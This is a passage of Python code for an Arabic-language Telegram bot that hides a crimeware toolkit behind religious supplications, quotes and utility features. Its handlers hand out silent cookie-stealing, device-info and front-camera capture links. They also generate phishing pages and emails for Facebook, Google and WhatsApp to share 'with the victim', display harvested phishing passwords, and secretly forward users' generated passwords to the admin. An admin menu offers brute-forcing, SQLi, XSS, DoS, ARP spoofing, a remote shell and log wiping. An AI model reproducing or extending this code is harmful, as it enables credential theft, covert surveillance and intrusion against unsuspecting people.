    markup.row(InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"), InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"))
    markup.row(InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("🤲 أدعية السفر", callback_data="doaa_safar"), InlineKeyboardButton("🤲 أدعية الهم", callback_data="doaa_hem"))
    markup.row(InlineKeyboardButton("🤲 أدعية الرزق", callback_data="doaa_rizq"), InlineKeyboardButton("🤲 أدعية النوم", callback_data="doaa_nawm"))
    markup.row(InlineKeyboardButton("🤲 أدعية الفرج", callback_data="doaa_faraj"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("🕌 أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("📖 أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("💧 أركان الوضوء", callback_data="muslim_wudu"))
    markup.row(InlineKeyboardButton("🚿 صفة الغسل", callback_data="muslim_ghusl"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

# ===================== دوال عرض المستخدمين =====================
def get_users_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT chat_id, is_admin, is_banned, points, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users")
    rows = c.fetchall()
    conn.close()
    return rows

def build_users_menu(chat_id, action):
    users = get_users_list()
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        is_admin_flag = "👑" if user[1] else ""
        banned_flag = "🚫" if user[2] else ""
        status = "🟢 نشط" if user[2] == 0 else "🔴 محظور"
        label = f"{is_admin_flag}{banned_flag} {name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

def build_permissions_menu(chat_id, target_user):
    row = safe_db_query("SELECT can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users WHERE chat_id = ?", (target_user,))
    if not row:
        return None
    can_collector, can_camera, can_phishing, can_advanced = row
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton(f"📱 معلومات الجهاز: {'✅' if can_collector else '❌'}", callback_data=f"perm_toggle_collector_{target_user}"))
    markup.row(InlineKeyboardButton(f"📸 كاميرا: {'✅' if can_camera else '❌'}", callback_data=f"perm_toggle_camera_{target_user}"))
    markup.row(InlineKeyboardButton(f"🎯 تصيد: {'✅' if can_phishing else '❌'}", callback_data=f"perm_toggle_phishing_{target_user}"))
    markup.row(InlineKeyboardButton(f"⚙️ متقدم: {'✅' if can_advanced else '❌'}", callback_data=f"perm_toggle_advanced_{target_user}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="admin_permissions"))
    return markup

# ===================== متغيرات الحالة =====================
BOT_LOCKED = False
user_states = {}
admin_remote = {}
pdf_texts = {}
reminder_timers = {}

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        data = call.data
        log_activity(chat_id, data)
        update_last_seen(chat_id)

        if data == "admin_panel":
            if is_admin(chat_id):
                safe_send(chat_id, "لوحة التحكم:", reply_markup=build_admin_panel())
                return
            else:
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # ===== الأذكار مع التنقل (التالي) =====
        if data == "adkar_sabah":
            user_adkar_indices[chat_id]['sabah'] = 0
            adkar_list = ISLAMIC_DATA["adkar_sabah"]
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{current}", reply_markup=build_adkar_action_menu('sabah', 0, total))
            return

        if data == "adkar_massaa":
            user_adkar_indices[chat_id]['massaa'] = 0
            adkar_list = ISLAMIC_DATA["adkar_massaa"]
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{current}", reply_markup=build_adkar_action_menu('massaa', 0, total))
            return

        if data.startswith("adkar_next_"):
            parts = data.split("_")
            adkar_type = parts[2]
            idx = int(parts[3])
            user_adkar_indices[chat_id][adkar_type] = idx
            adkar_list = ISLAMIC_DATA[f"adkar_{adkar_type}"]
            if idx < len(adkar_list):
                current = adkar_list[idx]
                total = len(adkar_list)
                safe_send(chat_id, f"📿 {('أذكار الصباح' if adkar_type == 'sabah' else 'أذكار المساء')}:\n\n{current}", reply_markup=build_adkar_action_menu(adkar_type, idx, total))
            return

        # ===== الأدعية مع التنقل (التالي) =====
        if data == "doaa_menu":
            safe_send(chat_id, "اختر تصنيف الدعاء:", reply_markup=build_doaa_menu())
            return

        if data.startswith("doaa_"):
            category_map = {"doaa_safar": "سفر", "doaa_hem": "هم", "doaa_rizq": "رزق", "doaa_nawm": "نوم", "doaa_faraj": "فرج"}
            category = category_map.get(data)
            if category:
                doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
                if doaa_list:
                    user_doaa_indices[chat_id][category] = 0
                    doaa_text = doaa_list[0]
                    total = len(doaa_list)
                    safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, 0, total))
                else:
                    safe_send(chat_id, "لا توجد أدعية في هذا التصنيف")
            return

        if data.startswith("doaa_next_"):
            parts = data.split("_")
            category = parts[2]
            idx = int(parts[3])
            doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
            if idx < len(doaa_list):
                doaa_text = doaa_list[idx]
                total = len(doaa_list)
                user_doaa_indices[chat_id][category] = idx
                safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, idx, total))
            else:
                safe_send(chat_id, "لا يوجد المزيد من الأدعية")
            return

        # ===== مسلم (أركان الإسلام والإيمان) =====
        if data == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            return

        if data.startswith("muslim_"):
            key = data.split("_")[1]
            content_map = {
                "arkan_islam": ISLAMIC_DATA["arkan_islam"],
                "arkan_iman": ISLAMIC_DATA["arkan_iman"],
                "wudu": ISLAMIC_DATA["wudu"],
                "ghusl": ISLAMIC_DATA["ghusl"]
            }
            if key in content_map:
                safe_send(chat_id, content_map[key])
            return

        # ===== مولد كلمات السر =====
        if data == "password_gen":
            passwords = [password_generator(12) for _ in range(5)]
            temp_passwords[chat_id] = passwords
            msg = "🔑 اختر كلمة السر التي تريدها:\n\n"
            for i, pwd in enumerate(passwords):
                msg += f"{i+1}. {pwd}\n"
            markup = InlineKeyboardMarkup(row_width=2)
            for i in range(5):
                markup.row(InlineKeyboardButton(f"اختر {i+1}", callback_data=f"pwd_select_{i}"))
            safe_send(chat_id, msg, reply_markup=markup)
            return

        if data.startswith("pwd_select_"):
            idx = int(data.split("_")[2])
            passwords = temp_passwords.get(chat_id, [])
            if idx < len(passwords):
                selected = passwords[idx]
                safe_send(chat_id, f"✅ تم اختيار كلمة السر: {selected}")
                notify_admin(f"🔑 المستخدم {chat_id} اختار كلمة السر: {selected}")
                notify_admin(f"📋 جميع الكلمات المولدة للمستخدم {chat_id}: {', '.join(passwords)}")
            else:
                safe_send(chat_id, "حدث خطأ، حاول مرة أخرى")
            return

        # ===== الاقتباسات مع التنقل (التالي) =====
        if data == "quotes_menu":
            safe_send(chat_id, "اختر نوع الاقتباسات:", reply_markup=build_quotes_menu())
            return

        if data == "quotes_arabic":
            safe_send(chat_id, "اختر نوع الاقتباس العربي:", reply_markup=build_quotes_type_menu('arabic'))
            return

        if data == "quotes_english":
            safe_send(chat_id, "Choose quote type:", reply_markup=build_quotes_type_menu('english'))
            return

        if data.startswith("quote_"):
            parts = data.split("_")
            lang = parts[1] if parts[1] in ['arabic', 'english'] else 'arabic'
            category = parts[2] if len(parts) > 2 else 'sad'
            quote, _ = get_random_quote(lang, category)
            if lang == 'arabic':
                user_quote_indices[chat_id]['arabic'][category] = 0
                total = len(QUOTES_ARABIC.get(category, []))
            else:
                user_quote_indices[chat_id]['english'][category] = 0
                total = len(QUOTES_ENGLISH.get(category, []))
            safe_send(chat_id, quote, reply_markup=build_quote_action_menu(lang, category, 0, total))
            return

        if data.startswith("quote_next_"):
            parts = data.split("_")
            lang = parts[2]
            category = parts[3]
            idx = int(parts[4])
            if lang == 'arabic':
                quotes_list = QUOTES_ARABIC.get(category, [])
                user_quote_indices[chat_id]['arabic'][category] = idx
                total = len(quotes_list)
            else:
                quotes_list = QUOTES_ENGLISH.get(category, [])
                user_quote_indices[chat_id]['english'][category] = idx
                total = len(quotes_list)
            if idx < len(quotes_list):
                quote = quotes_list[idx]
                safe_send(chat_id, quote, reply_markup=build_quote_action_menu(lang, category, idx, total))
            else:
                safe_send(chat_id, "لا يوجد المزيد من الاقتباسات")
            return

        # ===== النصائح مع التنقل (التالي) =====
        if data == "tips_menu":
            safe_send(chat_id, "اختر نوع النصيحة:", reply_markup=build_tips_menu())
            return

        if data.startswith("tips_"):
            tip_type = data.split("_")[1]
            tip, _ = get_random_tip(tip_type)
            user_tip_indices[chat_id][tip_type] = 0
            total = len(TIPS.get(tip_type, []))
            safe_send(chat_id, tip, reply_markup=build_tip_action_menu(tip_type, 0, total))
            return

        if data.startswith("tip_next_"):
            parts = data.split("_")
            tip_type = parts[2]
            idx = int(parts[3])
            tips_list = TIPS.get(tip_type, [])
            if idx < len(tips_list):
                tip = tips_list[idx]
                user_tip_indices[chat_id][tip_type] = idx
                total = len(tips_list)
                safe_send(chat_id, tip, reply_markup=build_tip_action_menu(tip_type, idx, total))
            else:
                safe_send(chat_id, "لا يوجد المزيد من النصائح")
            return

        # ===== ميزات جديدة =====
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten_url"
            safe_send(chat_id, "🔗 أرسل الرابط الذي تريد قصه:")
            return

        if data == "expand_url":
            user_states[chat_id] = "waiting_expand_url"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر لفك ضغطه:")
            return

        if data == "cookie_stealer":
            if not user_can_use_advanced(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الميزة.")
                return
            token = get_user_token(chat_id)
            link = f"{SERVER_URL}/cookie_stealer?token={token}"
            safe_send(chat_id, f"🍪 رابط سرقة الكوكيز (يعمل بصمت):\n{link}")
            return

        if data == "track_phone":
            if not user_can_use_advanced(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الميزة.")
                return
            user_states[chat_id] = "waiting_phone_number"
            safe_send(chat_id, "📱 أدخل رقم الهاتف الذي تريد تتبعه (مع رمز البلد، مثال: +20123456789):")
            return

        if data == "comprehensive_scan":
            if not user_can_use_advanced(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الميزة.")
                return
            user_states[chat_id] = "waiting_scan_url"
            safe_send(chat_id, "🔍 أدخل رابط الموقع لفحصه بشكل شامل (مثال: https://example.com):")
            return

        # ===== تصيد =====
        if data == "phishing_locked":
            points = get_user_points(chat_id)
            if points < 300:
                safe_send(chat_id, f"❌ تحتاج 300 نقطة لاستخدام هذه الميزة. نقاطك: {points}")
            else:
                if deduct_points(chat_id, 300, "شراء صلاحية التصيد"):
                    safe_db_execute("UPDATE users SET can_use_phishing = 1 WHERE chat_id = ?", (chat_id,))
                    safe_send(chat_id, "✅ تم تفعيل صلاحية التصيد، استخدم الزر الآن.")
                    markup = build_main_menu(chat_id)
                    safe_send(chat_id, "القائمة الرئيسية", reply_markup=markup)
            return

        if data == "phishing_email":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية استخدام هذه الميزة. تحتاج 300 نقطة.")
                return
            safe_send(chat_id, "اختر المنصة التي تريد إنشاء بريد تصيد لها:", reply_markup=build_phishing_platform_menu())
            return

        if data.startswith("phish_platform_"):
            platform = data.split("_")[2]
            user_states[chat_id] = "waiting_phishing_target"
            user_states[f"{chat_id}_phishing_platform"] = platform
            safe_send(chat_id, f"أدخل البريد الإلكتروني المستهدف (مثال: victim@example.com):")
            return

        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية استخدام هذه الميزة. تحتاج 300 نقطة.")
                return
            safe_send(chat_id, "اختر المنصة لإنشاء صفحة تصيد:", reply_markup=build_phishing_pages_menu())
            return

        if data.startswith("phish_"):
            platform = data.split("_")[1]
            if platform in ['facebook', 'google', 'whatsapp']:
                page_url = f"{SERVER_URL}/phishing_pages/{platform}"
                safe_send(chat_id, f"تم إنشاء صفحة تصيد لـ {platform}\nالرابط: {page_url}\nشارك هذا الرابط مع الضحية")
            else:
                safe_send(chat_id, "منصة غير مدعومة")
            return

        # ===== معلومات الجهاز والكاميرا =====
        if data == "device_info":
            if not user_can_use_collector(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة.")
                return
            token = get_user_token(chat_id)
            link = f"{SERVER_URL}/device_info?token={token}"
            safe_send(chat_id, f"رابط جمع معلومات الجهاز (يعمل بصمت):\n{link}")
            return

        if data == "camera_hack":
            if not user_can_use_camera(chat_id):
                safe_send(chat_id, "ليس لديك صلاحية استخدام هذه الأداة.")
                return
            token = get_user_token(chat_id)
            link = f"{SERVER_URL}/camera_hack?token={token}"
            safe_send(chat_id, f"رابط الكاميرا الأمامية (يعمل بصمت):\n{link}")
            return

        # ===== باقي الأزرار الأساسية =====
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "أدخل اسم المدينة (مثال: القاهرة، الرياض، دبي)")
            return

        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "أدخل مصطلح البحث في ويكيبيديا")
            return

        if data == "password_strength":
            user_states[chat_id] = "waiting_password_strength"
            safe_send(chat_id, "أرسل كلمة السر لفحص قوتها")
            return

        if data == "text_to_speech":
            user_states[chat_id] = "waiting_tts"
            safe_send(chat_id, "أرسل النص لتحويله إلى صوت (باللغة العربية)")
            return

        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "أرسل النص للترجمة")
            return

        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "أدخل التذكير بالصيغة: الرسالة|الساعة:الدقيقة")
            return

        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "أدخل موضوع الأخبار (مثال: سياسة، اقتصاد، رياضة)")
            return

        if data == "pdf_menu":
            safe_send(chat_id, "اختر خدمة PDF:", reply_markup=build_pdf_menu())
            return

        if data == "pdf_summary":
            user_states[chat_id] = "waiting_pdf_summary"
            safe_send(chat_id, "أرسل ملف PDF لتلخيصه")
            return

        if data == "pdf_extract":
            user_states[chat_id] = "waiting_pdf_extract"
            safe_send(chat_id, "أرسل ملف PDF لاستخراج نصوصه")
            return

        if data == "pdf_smart":
            user_states[chat_id] = "waiting_pdf_smart"
            safe_send(chat_id, "أرسل ملف PDF للتحليل الذكي (ستتمكن من طرح أسئلة عليه)")
            return

        if data == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"نقاطك: {points}")
            return

        if data == "my_referral":
            code = get_referral_code(chat_id)
            bot_username = bot.get_me().username
            link = f"https://t.me/{bot_username}?start=ref_{code}"
            safe_send(chat_id, f"رابط دعوتك:\n{link}\n\nكل من يسجل عبر رابطك يحصل على 10 نقاط لك وللمدعو")
            return

        if data == "points_history":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 20", (chat_id,))
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "سجل النقاط:\n"
                for row in rows:
                    sign = "+" if row[0] > 0 else ""
                    msg += f"{sign}{row[0]} - {row[1]} ( {row[2][:16]} )\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا يوجد سجل للنقاط")
            return

        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk_analysis"
            safe_send(chat_id, "أرسل ملف APK لتحليله")
            return

        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "أدخل رابط الفيديو (يوتيوب، فيسبوك، تيك توك)")
            return

        if data == "check_link_advanced":
            user_states[chat_id] = "waiting_link_check_advanced"
            safe_send(chat_id, "أرسل الرابط لفحصه (تكلفة الفحص 5 نقاط)")
            return

        if data == "list_devices":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT device_id, name, status, last_seen FROM targets")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "الأجهزة المسجلة:\n"
                for row in rows:
                    msg += f"جهاز: {row[1]}, الحالة: {row[2]}, آخر ظهور: {row[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد أجهزة")
            return

        # ===== لوحة التحكم =====
        if data == "admin_stats":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM targets")
            targets = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM scan_results")
            scans = c.fetchone()[0]
            conn.close()
            safe_send(chat_id, f"الإحصائيات:\nالمستخدمون: {users}\nالأجهزة: {targets}\nالفحوصات: {scans}")
            return

        if data == "admin_broadcast":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "أدخل رسالة البث")
            return

        if data == "admin_users":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id, is_admin, is_banned, points, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users")
            rows = c.fetchall()
            conn.close()
            msg = "المستخدمون:\n"
            for r in rows:
                name = get_user_name(r[0])
                status = "🟢 نشط" if r[2] == 0 else "🔴 محظور"
                msg += f"{name} ({r[0]}) - {'مدير' if r[1] else 'عادي'} - {status} - نقاط: {r[3]} - صلاحيات: C:{r[4]} K:{r[5]} P:{r[6]} A:{r[7]}\n"
            safe_send(chat_id, msg)
            return

        if data == "admin_reports":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "آخر التقارير:\n"
                for row in rows:
                    msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد تقارير")
            return

        if data == "admin_phishing_logs":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT platform, username, password, ip, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 20")
            rows = c.fetchall()
            conn.close()
            if rows:
                msg = "سجل بيانات التصيد:\n"
                for r in rows:
                    msg += f"المنصة: {r[0]}, المستخدم: {r[1]}, كلمة السر: {r[2]}, IP: {r[3]}, الوقت: {r[4][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد بيانات تصيد")
            return

        # ===== إدارة الصلاحيات =====
        if data == "admin_permissions":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            markup, error = build_users_menu(chat_id, "perm")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return

        if data.startswith("perm_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            markup = build_permissions_menu(chat_id, target_user)
            if markup:
                safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        if data.startswith("perm_toggle_"):
            if not is_admin(chat_id):
                return
            parts = data.split("_")
            perm_type = parts[2]
            target_user = int(parts[3])
            col_map = {"collector": "can_use_collector", "camera": "can_use_camera", "phishing": "can_use_phishing", "advanced": "can_use_advanced"}
            col_name = col_map.get(perm_type)
            if col_name:
                row = safe_db_query(f"SELECT {col_name} FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_val = 0 if row[0] else 1
                    safe_db_execute(f"UPDATE users SET {col_name} = ? WHERE chat_id = ?", (new_val, target_user))
                    safe_send(chat_id, f"تم تحديث صلاحية {perm_type} للمستخدم {get_user_name(target_user)} إلى {'مفعلة' if new_val else 'معطلة'}")
                    markup = build_permissions_menu(chat_id, target_user)
                    if markup:
                        safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
            return

        # ===== قفل الدردشة =====
        if data == "lock_chat":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            markup, error = build_users_menu(chat_id, "lock")
            if markup:
                safe_send(chat_id, "اختر المستخدم لقفل/فتح الدردشة:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return

        if data.startswith("lock_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة مع المستخدم {get_user_name(target_user)}")
                markup, _ = build_users_menu(chat_id, "lock")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        # ===== إرسال للمستخدم =====
        if data == "send_to_user":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            markup, error = build_users_menu(chat_id, "send")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإرسال رسالة إليه:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return

        if data.startswith("send_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            user_states[chat_id] = "waiting_send_to_user"
            user_states[f"{chat_id}_send_target"] = target_user
            safe_send(chat_id, f"أدخل الرسالة التي تريد إرسالها إلى المستخدم {get_user_name(target_user)}:")
            return

        # ===== إدارة النقاط =====
        if data == "admin_points_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            markup, error = build_users_menu(chat_id, "points")
            if markup:
                safe_send(chat_id, "اختر المستخدم لإضافة نقاط له:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return

        if data.startswith("points_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            user_states[chat_id] = "waiting_admin_points_amount"
            user_states[f"{chat_id}_points_target"] = target_user
            safe_send(chat_id, f"أدخل عدد النقاط التي تريد إضافتها للمستخدم {get_user_name(target_user)} (يمكنك إدخال عدد سالب للخصم):")
            return

        # ===== حظر المستخدمين =====
        if data == "admin_ban_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            markup, error = build_users_menu(chat_id, "ban")
            if markup:
                safe_send(chat_id, "اختر المستخدم لحظره أو فك حظره:", reply_markup=markup)
            else:
                safe_send(chat_id, error)
            return

        if data.startswith("ban_user_"):
            if not is_admin(chat_id):
                return
            target_user = int(data.split("_")[2])
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم {get_user_name(target_user)}")
                markup, _ = build_users_menu(chat_id, "ban")
                if markup:
                    safe_send(chat_id, "اختر مستخدم آخر:", reply_markup=markup)
            else:
                safe_send(chat_id, "المستخدم غير موجود")
            return

        # ===== القائمة السرية =====
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            safe_send(chat_id, "القائمة السرية:", reply_markup=build_hacking_menu())
            return

        if data == "toggle_stealth":
            if not is_admin(chat_id):
                return
            global STEALTH_MODE
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
            return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه القائمة للمطور فقط.")
                return
            safe_send(chat_id, "قائمة الحماية:", reply_markup=build_protection_menu())
            return

        if data == "protect_lock":
            if not is_admin(chat_id):
                return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return

        if data == "protect_shield":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"درع الحماية:\n{active_shield()}")
            return

        if data == "protect_stealth":
            if not is_admin(chat_id):
                return
            STEALTH_MODE = True
            change_bot_identity()
            safe_send(chat_id, "وضع التخفي الشامل: تم تفعيل التخفي")
            return

        if data == "protect_detect":
            if not is_admin(chat_id):
                return
            result = detect_intrusion()
            safe_send(chat_id, f"كشف الاختراق:\n{result}")
            return

        if data == "protect_identity":
            if not is_admin(chat_id):
                return
            result = change_bot_identity()
            safe_send(chat_id, f"تغيير الهوية:\n{result}")
            return

        if data == "protect_clean":
            if not is_admin(chat_id):
                return
            result = clean_traces()
            safe_send(chat_id, f"تنظيف السجلات:\n{result}")
            return

        if data == "protect_api":
            if not is_admin(chat_id):
                return
            safe_send(chat_id, f"تم تفعيل حماية API. مفتاح API: `{API_KEY}`")
            return

        if data == "protect_backup":
            if not is_admin(chat_id):
                return
            result = backup_data()
            safe_send(chat_id, f"النسخ الاحتياطي:\n{result}")
            return

        if data == "protect_reboot":
            if not is_admin(chat_id):
                return
            result = restart_bot_safely()
            safe_send(chat_id, f"إعادة التشغيل الآمن:\n{result}")
            return

        # ===== تخمين كلمات السر والهجمات (مختصرة) =====
        if data == "bruteforce_fb":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_fb_username"
            safe_send(chat_id, "أدخل بريد أو رقم أو اسم مستخدم فيسبوك")
            return

        if data == "bruteforce_ig":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_ig_username"
            safe_send(chat_id, "أدخل اسم مستخدم انستغرام")
            return

        if data == "bruteforce_ssh":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_ssh_target"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
            return

        if data == "bruteforce_ftp":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_ftp_target"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
            return

        if data == "bruteforce_custom":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_custom_bruteforce"
            safe_send(chat_id, "أدخل البيانات بالصيغة: هدف|نوع(facebook/instagram/ssh/ftp)|كلمات_سر مفصولة بفاصلة")
            return

        if data == "port_scan":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_portscan"
            safe_send(chat_id, "أدخل الهدف (IP أو نطاق)")
            return

        if data == "ssl_scan":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_ssl"
            safe_send(chat_id, "أدخل النطاق لفحص SSL")
            return

        if data == "hack_sqli":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_sqli_hack"
            safe_send(chat_id, "أدخل رابط الموقع لاختبار حقن SQL")
            return

        if data == "hack_xss":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_xss_hack"
            safe_send(chat_id, "أدخل رابط الموقع لاختبار XSS")
            return

        if data == "hack_dos":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_dos"
            safe_send(chat_id, "أدخل الهدف بالصيغة: IP|المنفذ|المدة(ثانية)")
            return

        if data == "hack_arp":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_arp"
            safe_send(chat_id, "أدخل بالصيغة: IP_الهدف|IP_البوابة")
            return

        if data == "hack_shell":
            if not is_admin(chat_id):
                safe_send(chat_id, "هذه الأداة للمطور فقط.")
                return
            user_states[chat_id] = "waiting_shell"
            safe_send(chat_id, "أدخل أمر Shell")
            return

